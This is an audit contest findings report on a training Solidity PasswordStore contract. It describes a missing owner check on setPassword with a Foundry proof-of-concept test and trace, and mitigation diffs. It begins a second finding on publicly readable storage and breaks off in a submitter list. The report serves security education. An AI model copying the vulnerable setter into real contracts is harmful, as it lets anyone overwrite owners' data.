# First Flight #1: PasswordStore - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. Anyone can set the password by calling `PasswordStore::setPassword`](#H-01)
    - [H-02. Owner's password stored in the `s_password` state variable is not a secret and can be seen by everyone](#H-02)

- ## Low Risk Findings
    - [L-01. Initialization Timeframe Vulnerability](#L-01)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #1

### Dates: Oct 18th, 2023 - Oct 25th, 2023

[See more contest details here](https://www.codehawks.com/contests/clnuo221v0001l50aomgo4nyn)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 2
   - Medium: 0
   - Low: 1


# High Risk Findings

## <a id='H-01'></a>H-01. Anyone can set the password by calling `PasswordStore::setPassword`

_Submitted by [0xAleko](/profile/clk7nn6t8000cm908fsspuwlw), [ironside](/profile/clnu03xlr0000mp08r7fms6nl), [Cosine](/profile/clkc7trh30004l208e0okerdn), [VIELITE](/profile/clkgpt9ux0000l308p2x6zcb2), [MysticalPistachio](/profile/cllddp01c0002jv08hrl2z70y), [kamui](/profile/clk8h2bxd000sia08o8nz21g2), [ret2basic](/profile/clk3swm9u000sl508pi6dlf3f), [uba7](/profile/cllina1ss0000jt08ols0vdm7), [anjalit](/profile/cllp2b2js0000l108bfqql9at), [yeahChibyke](/profile/clk40bik4000wjl087tjqrtti), [AzmaeenGH](/profile/clk6y22wr000yl7088q435slg), [nisedo](/profile/clk3saar60000l608gsamuvnw), [0xDimo](/profile/clk3wyfv00018l808jghcdjza), [kevinkien](/profile/clnieha040000l4088bamgykh), [Chandr](/profile/clka007jd0000k2086j3juoi9), [alsirang](/profile/clnvs6t2c000cjx08zxo9vgf4), [notvalidaccount](/profile/clnv49bjf0002l308q23jpmzx), [sandman](/profile/clk3zgbsd002kjq08p5vnhq23), [0xbigwing](/profile/clnvgyf9w000ami08pi5w3j4a), [funkornaut](/profile/clk4161cu0030mb08pybakf1m), [atrixs](/profile/clnvu55z30000mm0806828pzk), [joesan](/profile/clnam0oty0000ms08uoxq4q4t), [Zac369](/profile/clk5png2a0000l809z7kt06dn), [nuthan2x](/profile/clnu96508000wl1084ehhgiyg), [Magnetto](/profile/clk4l6dqd0000l908bhjb9bwl), [gin](/profile/cllytqrdo0000l608z30ww6gz), [FalconHoof](/profile/clkcm5dsf0000mc083q6clddz), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [Timenov](/profile/clkuwlybw001wmk08os9pfnd1), [0xkeesmark](/profile/clk40arb0000gjl08ze5pyblk), [darksnow](/profile/clk80pzvl000yl608bqwqky5y), [Rotcivegaf](/profile/clk3ziayk002ojq08apo5ojrt), [Nachoddiaz](/profile/clk73oin5002wl508bw4w9d2z), [Proxy](/profile/clk3x79a8000gmg083h7fjmul), [MrPotatoMagic](/profile/clk3to00g001cl5087hsgvbey), [0x6a70](/profile/clnupn4c20002mk08inaqc8is), [itsabinashb](/profile/cll1sm4bn0000mp08bnr86vf8), [tsar](/profile/clk9isayj0004l30847ln1e8j), [anarcheuz](/profile/clmrussuq0008l008ao5w04v1), [bLnk](/profile/clnuayizj000hmr08t3lfbhtq), [OOOOOOOOOOOOOOOOOO](/profile/clnuisbu70000mi08suwbsf49), [adilc](/profile/clnu8jp510000l609l5wdt2qd), [ABA](/profile/clk43rqfo0008mg084q0ema3g), [ElHaj](/profile/clk40nytj001umb08c4ub87gx), [atoko](/profile/clm2alxk30000mm08ek2xnrbs), [karanel](/profile/clmyzofbv0000ld08bwfuehpt), [Aamirusmani1552](/profile/clk6yhrt6000gmj082jnn4770), [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [gabr1sr](/profile/clmfxyro20000ml08g3xzq1wa), [x0rd3v1l](/profile/clmisl0230000ld08mrft8vpt), [caxva](/profile/clnuqq3ei0008mj08ho7bbjhj), [bytes1](/profile/clltjyli6000wlf08wia9q2nx), [Mj0ln1r](/profile/clnw3c67y0006l008w2vljk2q), [SaudxInu](/profile/clntyl9000008k009s910t0zg), [light](/profile/clnw2uaac001sjt081nlecry8), [0xhuy0512](/profile/clk80hto50004m908dr18akv7), [IvanFitro](/profile/clkbfsgal0004me08ro82cg7e), [Testerbot](/profile/clnw1lao7000ujt084kksazwm), [happyformerlawyer](/profile/clmca6fy60000mp08og4j1koc), [lordforever](/profile/clk4bpmyh001uld08sp3aumqh), [laithx9](/profile/cln3l959n0008kt08mvd8qtra), [Davide](/profile/clndp4ggs0000mf082wp5l22p), [0xloscar01](/profile/cllgowxgy0002la08qi9bhab4), [ararara](/profile/clntr7eq20000ia08oode1zz7), [yongtaufoo](/profile/clk7glclf000omi08u2v9s6oz), [rufflabs](/profile/clnw0093y000oms08reihmvs5), [longzai](/profile/clk446r7m001cmg08ehgs07lt), [Andrew](/profile/clnwivog70000ld08vlwh56ex), [0xjacopod](/profile/clnwpe3tf000jjr088krrw31q), [danielvo102](/profile/clk3suqe2001cmj08y52zoqab), [0xAbhay](/profile/clnwpdjb00006jr088q416aog), [dalaillama](/profile/clnuanmi90000l008rnzcyiuq), [kuldeepyeware](/profile/clk3ypbd7000sla08hijd4q0d), [tpiliposian](/profile/clnwsmii60000jq08rqe1buzt), [0xmusashi](/profile/cllfe326u0004mm08qjo85t59), [Aitor](/profile/clk44j5cn000wl908r2o0n9w5), [aethrouzz](/profile/clmx62ogr0000l90843cr8gtz), [Arav](/profile/cllxdkivi0000l708ygjcud1q), [KiteWeb3](/profile/clk9pzw3j000smh08313lj91l), [lileth](/profile/clk46om4p001el508li67ukm4), [Polaristow](/profile/clk40hl6t000wmb08y3268i63), [okolicodes](/profile/clk49twof000gmr08p6bz6y76), [merklebonsai](/profile/clk71ugq8000cjt08gowznyuq), [slasheur](/profile/clnvgvxwk000el1087juqjdjz), [Luka](/profile/clnuevrco000ul408x4ihghzy), [MikeDougherty](/profile/clnuc4zbb000cl508b6gnobqi), [polarzero](/profile/clmc0pcqb000il808wcs6eq18), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [0xfave](/profile/clk4hye1a0010mk083ht6dzld), [IceBear](/profile/cllnrqkdu0008lc08luxl02vh), [Modey](/profile/clk7cgj0j000alc08b0gl3epd), [00decree](/profile/clnge53mh0000jv08gajav1nt), [lealCodes](/profile/clk933eiw0002mg08rvrq95ee), [Niki](/profile/clk53uz6j0008lc08sv8ltp2x), [Silverwind](/profile/clld9fbfq0000l908smg5kh8s), [ljj](/profile/clk3ttrj4001mib08qqu3vgk4), [0xJimbo](/profile/clkcjsdhb0000l108bm19v6sw), [zzz](/profile/clk6zdyd4000gkz0892q2rvyn), [Denzi](/profile/clnvfit56000bl008kg599zbt), [CryptoAudit](/profile/clndf8abb000gjt084g7egb84), [sonny2k](/profile/clk51hohw0000mr08nfrnlewz), [numbernine](/profile/clk45bc62001kl908bls4fcr8), [0xVinylDavyl](/profile/clkeaiat40000l309ruc9obdh), [blocktivist](/profile/clnu205ge0000jy08nj936oiy), [0xla](/profile/clnuc69kb000il00828pax7ap), [BTinoRi](/profile/clnv2xw7i0007ml08ky7nef88), [0xTheBlackPanther](/profile/clnca1ftl0000lf08bfytq099), [WangAudit](/profile/clnxia5yx0006ju08lkeccntm), [0xGhali](/profile/clnx223bf000ylh080825sajg), [KlounOtmustitel](/profile/clnxnj0op0008lf08av0esmfc), [merlinboii](/profile/clnxnj1ow000ll008rx7zrb8h), [jnrlouis](/profile/clk4myztd0000l408kiebyflx), [acu](/profile/cllsuuxkb0000l808c4hwluy7), [Eric](/profile/clkbqsa510000mi082he56qby), [HandsomeGiraffe](/profile/clk7l33pd000elc08wecsa0hb), [trauki](/profile/cllq1dzsq0000mh08q4ygxk1t), [nervouspika](/profile/clk8s260t000el108iz3yrkhy), [zxarcs](/profile/clk6xhhll0004jy08igg6220s), [Ericselvig](/profile/clk3tbdri000qib08vc8d5xn2), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [Osora9](/profile/clnvjxx5m0002mr08m4o4dl44), [eeshenggoh](/profile/clmlj6skc0000ml084rcney77), [0xbjorn](/profile/clnxo3ksf0000l508i9e2vtom), [gusredo](/profile/clnusft9j000zmj08imd84itu), [0xads90](/profile/clnw5otvd0006mh08hnbu70bw), [victor](/profile/clnbgx6030008mc08rxxhwgtl), [Hueber](/profile/clnu9gz9k0006l609yi4yh7rg), [robbiesumner](/profile/clk7cxmsg000klc08n5r6wgfc), [dcheng](/profile/clnw5u1te0006l708th66izul), [ZdravkoHr](/profile/clkmey53n0018l008gwzuqcmu), [nmirchev8](/profile/clkao1p090000ld08dv6v2xus), [harpaljadeja](/profile/clmdiw5fu0000mf08iem80oqx), [0xprinc](/profile/clk8byeg70000mn08u1s1a0om), [zach030](/profile/clllg9trq0002ml0881bhkegb), [zhuying](/profile/clk5hy2a0000ajy087yh41k20), [tinotendajoe01](/profile/clk4aef91000sld08c1vav7px), [rapstyle](/profile/clk6o7o150000mg08u11bf4ua), [SecurityDev23](/profile/clk46s8m10022la08qgfsxkfu), [SargeSMITH](/profile/clk58rin50000mk0847s4gjvo), [mladenov](/profile/clnyzovms000cl008qv1zxdg5), [dougo](/profile/clnvz1v7u0000mg07ikf4cqcd), [ugrru](/profile/clnub5s6w000kmr08q6rgbu4u), [0xsagetony](/profile/clnxw408y000gl6086iqksw4c), [EngrPips](/profile/clllaqpwa0000ld08rkvlimu8), [ahmedjb](/profile/clm1a2m6f0000k308848lg7do), [jerseyjoewalcott](/profile/clnueldbf000lky08h4g3kjx4), [Aarambh](/profile/clk687ykf0000l608ovci3h3y), [CryptoThemeX](/profile/cllkrohv40020l308abiebtb3), [zuhaibmohd](/profile/clk9l0cjq000iih08gux5zwob), [0xSimeon](/profile/clk4oou2i0000l808pkf7krr7), [etherhood](/profile/clkgulfrb0002jq08t4mwxpvy), [PeCo999](/profile/clnvr80ca0018mg08u3ithdsv), [kali](/profile/clmiwfnm00000mh087a12z41n), [intellygentle](/profile/clnur0zc30005l308rt7rewm9), [ThermoHash](/profile/clk89rwlt0000mr09jtlo75v6), [karthick](/profile/cln4wpzki0000l108bxoo7sbu), [0xPinto](/profile/clk7308tp0022l508nclvqhqn), [0x0115](/profile/clk4scd7q0000l208rpyf7gvh), [KrisRenZo](/profile/cln34hwg10000ld09wex2xukq), [efecarranza](/profile/clnu83dx3000jl1088pfm1okk), [wallebach](/profile/clntzn5gl0000lg08239tslcp), [trav](/profile/clnudetgw0006l408wgqvuete), [0xLuke4G1](/profile/clnum02zf0006l708sllkt43p), [0xsandy](/profile/clk43kus5009imb0830ko7dxy), [letsDoIt](/team/clkjtgvih0001jt088aqegxjj), [0xfuluz](/profile/clnzti7fb0006mf084zv1nm96), [MaanVader](/profile/clk8lcnn40012mq08dtb5fzfg), [sach1r0](/profile/cll7u5uo40000l008jol2bu5h), [uint256vieet](/profile/clkxj0sw20028l0085e7qx21j), [0xspryon](/profile/clo19fw280000mf08c4yazene), [stakog](/profile/clmqkms6k0004mn08mbsf2p7f), [97Sabit](/profile/clk42eeq0007mla08lc11yszp), [PratRed](/profile/clkkqoyem0008jw08qno0zb4f), [Equious](/profile/clldzdkk60000mr082grbuj97), [PTolev](/profile/clk3wuu9e000kmf08tbdth8ir), [Kodak](/profile/clkbnsqx40008lc08n0y0kd20), [crypt0mate](/profile/clk82i8pg0000jo08jat0qepq), [David77](/profile/clll3wigw0008mf08byd7jzzy), [0x4non](/profile/clk3udrho0004mb08dm6y7y17), [836541](/profile/clmjmucu80008l408y33vhxfq), [KURO](/profile/cln6wuqc6000ol808dd8imjox), [DuncanDuMond](/profile/clnzr98ch0000mg08irvcdl92), [2pats](/profile/clo2cd6np000dl2091dqd135p), [Topmark](/profile/clk8dnw610000mm085mho9uwp), [Charalab0ts](/profile/clnvg04ao0000mi08o5ui3i8u), [0xVicN](/profile/clnufke21000oky08qtow3agy), [prorocketh](/profile/clo2kz3qt000cmf08647nwz0f), [bhvrvt](/profile/clnu2w6ka000lmf086jwlnbf4), [ke1caM](/profile/clk46fjfm0014la08xl7mwtis), [MrjoryStewartBaxter](/profile/clk6xkrq00008l708g23xstn9), [Skalv](/profile/clme10uze0000la09jxfemuv2), [syahirAmali](/profile/clnu8nrct0003l609em65nls5), [naman1729](/profile/clk41lnhu005wla08y1k4zaom), [cats](/profile/clkpcyd8s0000mm08gto4lwp7), [0x013ev](/profile/clnzsqfxs0000mf08w2mb59dm), [karanctf](/profile/clk85gz2g0006mw087jgqqicj), [remedcu](/profile/clk3t0yen001smj084r0hn49p), [zen4269](/profile/clnuh6eoq0012l408590tbzrz), [danlipert](/profile/clnykqixa0000mf08qa9u8qoz), [ironcladmerc](/profile/clnue0hoa0006ky08p2fc7lv5), [lionel](/profile/clk3ucvno0000m908ueni2yhd), [0xSwahili](/profile/clkkxnjij0000m808ykz18zsc), [Marcologonz](/profile/clo2jvaqo0006mf08co9ntqpt), [Phantomsands](/profile/clmzkqz160000l208a61xhvi5), [mahivasisth](/profile/clk86z1bk000olh08he15prja), [SubhradeepS158](/profile/clnxj4psd0006mc08t4emind1), [ecwarrior13](/profile/clkbjru3t0000l10809pji3ke), [n4thedev01](/profile/clnybjmgf0001l708j472drqp), [bronzepickaxe](/profile/clk85kzum0008l9086dj0suek), [ETHANHUNTIMF99](/profile/clnw21fzq0003le08a70dcond), [thetechnofeak](/profile/clk9dpjvm000cmm08ae2qelw4), [ihtishamsudo](/profile/clk45qe6f0004la08qheax87s), [aviksaikat](/profile/clkpe1roy000wmm08xhyes74k), [Dutch](/profile/clnvncrk9000il408ns2kcgj6), [0xMUSA1337](/profile/clnxkvihy000ijq08teh393g3), [0xgd](/profile/clo3l6cr5000cky08f01v4242), [luiscfaria](/profile/clm5kij1w0000l408b5x7s42q), [jefestar](/profile/cll6xqjt80000mf081iuw0cua), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [m1nd0v3rfl0w](/profile/clk484xtk0046l508lncw2zo7), [alymurtazamemon](/profile/clk3q1mog0000jr082dc9tipk), [boredpukar](/profile/clkarpfyo000cl90845grept2), [editdev](/profile/cll3pdmd80000kz08bqrz7bpo), [ro1sharkm](/profile/clk56pzim0006l508uumuo4oq), [Heba](/profile/clo3cb5nv000mmj087plzmqy8), [ezerez](/profile/clnueax9c000ll408f0qz7sa2), [Damilare](/profile/clo459tih000imk08i8q3oy47), [Prabhas](/profile/clo469tki000vmk084z9qbdc1), [klaus](/profile/clkwlspwi002sk008f6i0bjvu), [dadev](/profile/clo3aywnt000cmp084y4he5br), [silvana](/profile/clnurvzom000kmj08hko9u6dv), [Awacs](/profile/clo47qxsq001dm808b0vjbta1), [codyx](/profile/clo15yq5l0000ml08qecr06jr), [theirrationalone](/profile/clk46mun70016l5082te0md5t), [Random](/profile/clmarm50b0002md08d3iycbx4), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [0xouooo](/profile/clk7xf47o0000mo084h5vahse), [MufDSol](/profile/clo4aw58i0000jt08qznuwjjq), [0xblackskull](/profile/clkwtslu60008l108sp17rghc), [EmanHerawy](/profile/cllknyev7000alc087jsf4zi2), [araj](/profile/clma4kzm40000lb08cngnui6u), [Bube](/profile/clk3y8e9u000cjq08uw5phym7), [0x8e88](/profile/clo3qy6fe0000mf08gcv5b2zl), [sm4rty](/profile/clk4170ln003amb088n137st7), [0xKriLuv](/profile/clo4gftul0016jv08pfpi5md6), [mgf15](/profile/clk993ol40000mr08qghps3lm), [Avi17](/profile/clk3tjq1r0012ib0871kwj2tw), [toddteller](/profile/clo2z1sol0000mn08kyo1dzud), [0xaman](/profile/cln8ldajr0000jy085cig6cz4), [wafflemakr](/profile/clmm1t0210000mi08hak3ir5r), [zadev](/profile/clo4l66aa0000md08lazlawbn), [Maroutis](/profile/clkctygft000il9088nkvgyqk), [TorpedopistolIxc41](/profile/clk5ki3ah0000jq08yaeho8g7), [sobieski](/profile/clk7551e0001ol408rl4fyi5s), [likkee](/profile/clnxfy6qu0000mv08c0bwyhvr), [Ekiio](/profile/clnvgtp870006l108d20nqnib), [cryptonoob](/profile/clmo2h6lp0000ky089r3nlixn), [cRat1st0s](/profile/clk40jnqb003ela082lym3lj7), [Nayan](/profile/clo4o84eg0000mm081x5gv3lv), [JCM](/profile/clnw3vct00000le08kr1yfrx7), [0xDrMoon](/profile/clo4oqlq4000umm08fvz0xmu0), [asuiTouthang](/profile/clk9bd0tr0000mi084i1py0rx), [Chput](/profile/clo4mhw7q0006mm08j385wf5r), [tutkata](/profile/cllj4oszn0000lc08gehftn5s), [Nocturnus](/profile/clk6gsllo0000mn08rjvbjy0x), [TumeloCrypto](/profile/clo14gtlr0000mi08ylfhaqww), [0xdraiakoo](/profile/clk3xadrc0020l808t9unuqkr), [damoklov](/profile/clnvpqak60009mh082jw2lgna), [0xSCSamurai](/profile/clk41wibj006sla08llbkfxxu), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [King](/profile/clk4dhb4a0000k308nu6ydtgb), [Kose](/profile/clk3whc2g0000mg08zp13lp1p), [Scoffield](/profile/cll10q0wm0000jx088qp7gads), [benbo](/profile/clo4tx3kj0000l808q2ug31l8), [Kelvineth](/profile/clkaa82lg0000l308jv5dbr1o), [rocket](/profile/clo4us02w000ci908zogzemab), [0xraion](/profile/cll8ga6ix0000l208u3eu4zfc), [CodeLock](/profile/clo3l5kyo0000mk08r3no7q4n), [DappDojo](/profile/clnyx0enk0006l10805ktik8g), [Omeguhh](/profile/clkvbx923003kl008u2lvm36y), [0x0bservor](/profile/clk84a1vx0028m908i1rsjdgq), [0xnevi](/profile/clk3twjk3003imj08kmy05ubk), [daryletan](/profile/clo4yjsm90000mm08hglf3zzl), [UnvirsalX](/profile/clnixqw4u0000mk08w5bfor4x), [0xprettychimes](/profile/cll7rlpfc0004ia08evjm70rp), [innertia](/profile/clkqyrmqu000gkz08274w833n), [ivaniuss](/profile/clnum7noq0009l708lbm1za0u), [Nobita](/profile/clo0we9sg0000l508n64qt0nf), [timo](/profile/clkgvyedg001cjq08pyqnjlnf), [jasmine](/profile/clkarmt9n0000l908usstgujw), [usmanfarooq90](/profile/clk47y2ey0038la088eca1es3), [whiteh4t9527](/profile/clo5gva7c000qju08mwizp15i), [serialcoder](/profile/clkb309g90008l208so2bzcy6), [0xdangit](/profile/clnui7kb50000mi080ap2y4t5), [firmanregar](/profile/clk83mi5b0004jp08axr82nq1), [patrooney](/profile/clk42qdto008ula08u8m9z7jc), [Oozman](/profile/clnu31wgx0000jy08f68hn16l), [dianivanov](/profile/clo3cuadr0017mp08rvq00v4e), [0x11singh99](/profile/clkhsr7bn0000l608c9vc7ugr), [Louis](/profile/clloixi3x0000la08i46r5hc8), [azanux](/profile/clk45q9ry0000l5080kf923kw), [djanerch](/profile/clkv0whr4000wl608y1s0p7o4), [0xAxe](/profile/clk43mzqn009wmb08j8o79bfh), [0xYudhishthra](/profile/clo4kiovm0016la08glwxmr08), [printfjoby](/profile/clo5mosul0022ju08x9xxkh0c), [0xF001](/profile/clo5o3946001yl008mleiv1kj), [radeveth](/profile/clk406c5j0008jl08i3ojs45y), [ParthTheAuditor](/profile/clnxhgcol0000l309b8s65uhq). Selected submission by: [Ciara](/profile/clnvs09md0006jx08tmvz0w19)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-PasswordStore/blob/856ed94bfcf1031bf9d13514cb21b591d88ed323/src/PasswordStore.sol#L31C5-L40C6

## Summary

The `PasswordStore` contract assumes that only the owner can set the password. The `setPassword()` function modifies the `s_password` storage variable, where the password is set, but doesn't include access control meaning that anyone, including a malicious actor, can reset the owner's password.

## Vulnerability Details

This vulnerability exists in the `PasswordStore::setPassword` function in the `PasswordStore.sol` file starting on [line 26](https://github.com/Cyfrin/2023-10-PasswordStore/blob/856ed94bfcf1031bf9d13514cb21b591d88ed323/src/PasswordStore.sol#L26).

The `setPassword()` function includes no access controls meaning that anyone can call it and modify the password:

```solidity
/*
     * @notice This function allows only the owner to set a new password.
     * @param newPassword The new password to set.
     */
    function setPassword(string memory newPassword) external {
        s_password = newPassword;
        emit SetNetPassword();
    }
```

To restrict who can modify the password, there needs to be a check that the function caller, the `msg.sender`, is the owner of the contract.

## Impact

A possible potential use case for this contract is that the owner, the address stored in the storage variable `s_owner`, wants to use the contract as a password manager. If someone else can modify the password then the contract will not return the password they intended to store. This negates the intended use of the contract.

Since anyone, inluding malicious actors, can set the password, this opens up to the possibility that, depending on the context, these unsantisied and potentially malicious strings could be dangerous.

As per the following NatSpec comment: `This function allows only the owner to set a new password`, only the owner being able to set the password is the core assumtion, and functionality that does not hold, this is a high severity vulnerability.

## Proof of Concept

### Working Test Case

The `makeAddr` helper function is used to setup an `attacker` address to call the `setPasword()` function:

```diff
contract PasswordStoreTest is Test {
    PasswordStore public passwordStore;
    DeployPasswordStore public deployer;
    address public owner;
+   address public attacker;

    function setUp() public {
        deployer = new DeployPasswordStore();
        passwordStore = deployer.run();
        owner = msg.sender;
        // attacker address
+       attacker = makeAddr("attacker");
    }
}
```

The following test, sets the password to `"attackerPassword"` using the attacker address. When run, this test will pass, demonstrating that the attacker can set the password:

```solidity
    function test_poc_non_owner_set_password() public {
        // initiate the transaction from the non-owner attacker address
        vm.prank(attacker);
        string memory newPassword = "attackerPassword";
        // attacker attempts to set the password
        passwordStore.setPassword(newPassword);
        console.log("The attacker successfully set the password:" newPassword);
    }
```

Run the test:

```bash
forge test --mt test_poc_non_owner_set_password -vvvv
```

Which yields the following output:

```bash
unning 1 test for test/PasswordStore.t.sol:PasswordStoreTest
[PASS] test_poc_non_owner_set_password() (gas: 20776)
Logs:
  The attacker successfully set the password: attackerPassword

Traces:
  [20776] PasswordStoreTest::test_poc_non_owner_set_password()
    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← ()
    ├─ [6686] PasswordStore::setPassword(attackerPassword)
    │   ├─ emit SetNetPassword()
    │   └─ ← ()
    ├─ [0] console::log(The attacker successfully set the password: attackerPassword) [staticcall]
    │   └─ ← ()
    └─ ← ()

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.36ms
```

## Recommended Mitigation

Include access control to restrict who can call the `setPassword` function to be only the owner: `s_owner`. This can be achieved in two ways:

1. Using an `if` statement, as used in the `getPassword` function, and revert with the `PasswordStore__NotOwer()` custom error if the address calling the function is not the owner:

```diff
    function setPassword(string memory newPassword) external {
        // @audit check that the function caller is the owner of the contract
+        if (msg.sender != s_owner) {
+            revert PasswordStore__NotOwner();
+        }
        s_password = newPassword;
        emit SetNetPassword();
    }
```

2. Using an access modifier e.g. OpenZeppelin's `onlyOwner`. To use this modifier, the `PasswordStore` contract will need to inherit from OpenZeppelin's `Ownable` contract and call it's constructor inside the constructor of `PasswordStore`:

```diff
 // @audit import the ownable contract from OpenZeppelin
+ import "@openzeppelin/contracts/ownership/Ownable.sol";

 // @audit inherit from the Ownable contract
+ contract PasswordStore is Ownable{
    error PasswordStore__NotOwner();

    address private s_owner;
    string private s_password;

    event SetNetPassword();

+    constructor() Ownable() {
        s_owner = msg.sender;
    }
}
```

As per the OpenZeppelin documentation, by default, the `owner` of an `Ownable` contract is the account that deployed it, meaning that the `s_owner` state variable can be removed.

Using `onlyOwner` modifier adds logic to check that the `msg.sender` is the `owner` of the contract before executing the function's logic:

```diff
    /*
     * @notice This function allows only the owner to set a new password.
     * @param newPassword The new password to set.
     */
+   function setPassword(string memory newPassword) external onlyOwner {
        s_password = newPassword;
        emit SetNetPassword();
    }
```

## Tools Used

- [Forge](https://book.getfoundry.sh/forge/)

## <a id='H-02'></a>H-02. Owner's password stored in the `s_password` state variable is not a secret and can be seen by everyone

_Submitted by [Cosine](/profile/clkc7trh30004l208e0okerdn), [VIELITE](/profile/clkgpt9ux0000l308p2x6zcb2), [ret2basic](/profile/clk3swm9u000sl508pi6dlf3f), [0xDimo](/profile/clk3wyfv00018l808jghcdjza), [anarcheuz](/profile/clmrussuq0008l008ao5w04v1), [kevinkien](/profile/clnieha040000l4088bamgykh), [x0rd3v1l](/profile/clmisl0230000ld08mrft8vpt), [nisedo](/profile/clk3saar60000l608gsamuvnw), [nuthan2x](/profile/clnu96508000wl1084ehhgiyg), [Magnetto](/profile/clk4l6dqd0000l908bhjb9bwl), [Chandr](/profile/clka007jd0000k2086j3juoi9), [atrixs](/profile/clnvu55z30000mm0806828pzk), [Zac369](/profile/clk5png2a0000l809z7kt06dn), [gin](/profile/cllytqrdo0000l608z30ww6gz), [Timenov](/profile/clkuwlybw001wmk08os9pfnd1), [0xkeesmark](/profile/clk40arb0000gjl08ze5pyblk), [funkornaut](/profile/clk4161cu0030mb08pybakf1m), [Nachoddiaz](/profile/clk73oin5002wl508bw4w9d2z), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [adilc](/profile/clnu8jp510000l609l5wdt2qd), [darksnow](/profile/clk80pzvl000yl608bqwqky5y), [Proxy](/profile/clk3x79a8000gmg083h7fjmul), [akhilmanga](/profile/clk48iw7c0056l508gqk81x6a), [0x6a70](/profile/clnupn4c20002mk08inaqc8is), [MrPotatoMagic](/profile/clk3to00g001cl5087hsgvbey), [OOOOOOOOOOOOOOOOOO](/profile/clnuisbu70000mi08suwbsf49), [0x3b](/profile/clk3yiyaq002imf088cd3644k), [bLnk](/profile/clnuayizj000hmr08t3lfbhtq), [tsar](/profile/clk9isayj0004l30847ln1e8j), [ABA](/profile/clk43rqfo0008mg084q0ema3g), [ElHaj](/profile/clk40nytj001umb08c4ub87gx), [Aamirusmani1552](/profile/clk6yhrt6000gmj082jnn4770), [karanel](/profile/clmyzofbv0000ld08bwfuehpt), [light](/profile/clnw2uaac001sjt081nlecry8), [SaudxInu](/profile/clntyl9000008k009s910t0zg), [gabr1sr](/profile/clmfxyro20000ml08g3xzq1wa), [0xhuy0512](/profile/clk80hto50004m908dr18akv7), [IvanFitro](/profile/clkbfsgal0004me08ro82cg7e), [Testerbot](/profile/clnw1lao7000ujt084kksazwm), [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [happyformerlawyer](/profile/clmca6fy60000mp08og4j1koc), [lordforever](/profile/clk4bpmyh001uld08sp3aumqh), [0xethanol](/profile/clk5f1wwv0000mo08qcnt8byt), [Davide](/profile/clndp4ggs0000mf082wp5l22p), [ararara](/profile/clntr7eq20000ia08oode1zz7), [0xloscar01](/profile/cllgowxgy0002la08qi9bhab4), [yongtaufoo](/profile/clk7glclf000omi08u2v9s6oz), [longzai](/profile/clk446r7m001cmg08ehgs07lt), [0xjacopod](/profile/clnwpe3tf000jjr088krrw31q), [0xAbhay](/profile/clnwpdjb00006jr088q416aog), [dalaillama](/profile/clnuanmi90000l008rnzcyiuq), [cem](/profile/clkb9m88m0004l9082ly4fz49), [tpiliposian](/profile/clnwsmii60000jq08rqe1buzt), [Arav](/profile/cllxdkivi0000l708ygjcud1q), [aethrouzz](/profile/clmx62ogr0000l90843cr8gtz), [Aitor](/profile/clk44j5cn000wl908r2o0n9w5), [KiteWeb3](/profile/clk9pzw3j000smh08313lj91l), [lileth](/profile/clk46om4p001el508li67ukm4), [m4k2](/profile/clk7i797n0004ku08oxz4jl9z), [Polaristow](/profile/clk40hl6t000wmb08y3268i63), [slasheur](/profile/clnvgvxwk000el1087juqjdjz), [0xmusashi](/profile/cllfe326u0004mm08qjo85t59), [merklebonsai](/profile/clk71ugq8000cjt08gowznyuq), [Luka](/profile/clnuevrco000ul408x4ihghzy), [polarzero](/profile/clmc0pcqb000il808wcs6eq18), [SHA256](/profile/clnd0ral90008lh08kpxqjyvu), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [IceBear](/profile/cllnrqkdu0008lc08luxl02vh), [00decree](/profile/clnge53mh0000jv08gajav1nt), [Silverwind](/profile/clld9fbfq0000l908smg5kh8s), [zzz](/profile/clk6zdyd4000gkz0892q2rvyn), [lealCodes](/profile/clk933eiw0002mg08rvrq95ee), [ljj](/profile/clk3ttrj4001mib08qqu3vgk4), [0xVinylDavyl](/profile/clkeaiat40000l309ruc9obdh), [sonny2k](/profile/clk51hohw0000mr08nfrnlewz), [tychaios](/profile/clllk3iz80000jt08og98fzdl), [blocktivist](/profile/clnu205ge0000jy08nj936oiy), [0xTheBlackPanther](/profile/clnca1ftl0000lf08bfytq099), [merlinboii](/profile/clnxnj1ow000ll008rx7zrb8h), [0xGhali](/profile/clnx223bf000ylh080825sajg), [0xJimbo](/profile/clkcjsdhb0000l108bm19v6sw), [acu](/profile/cllsuuxkb0000l808c4hwluy7), [jnrlouis](/profile/clk4myztd0000l408kiebyflx), [robbiesumner](/profile/clk7cxmsg000klc08n5r6wgfc), [Eric](/profile/clkbqsa510000mi082he56qby), [HandsomeGiraffe](/profile/clk7l33pd000elc08wecsa0hb), [Ericselvig](/profile/clk3tbdri000qib08vc8d5xn2), [nervouspika](/profile/clk8s260t000el108iz3yrkhy), [alphabuddha1357](/profile/clnxv56t30004l6085wcq3syn), [Andrew](/profile/clnwivog70000ld08vlwh56ex), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [eeshenggoh](/profile/clmlj6skc0000ml084rcney77), [0xbjorn](/profile/clnxo3ksf0000l508i9e2vtom), [Giorgio](/profile/clk3t8gh1000iib08z1nz6equ), [C0D30](/profile/clnjbh3c10000l7086io4m3vl), [kamui](/profile/clk8h2bxd000sia08o8nz21g2), [ZdravkoHr](/profile/clkmey53n0018l008gwzuqcmu), [nmirchev8](/profile/clkao1p090000ld08dv6v2xus), [stakog](/profile/clmqkms6k0004mn08mbsf2p7f), [harpaljadeja](/profile/clmdiw5fu0000mf08iem80oqx), [0xdark1337](/profile/clmfo5uje0000mg08bvvwu65u), [tinotendajoe01](/profile/clk4aef91000sld08c1vav7px), 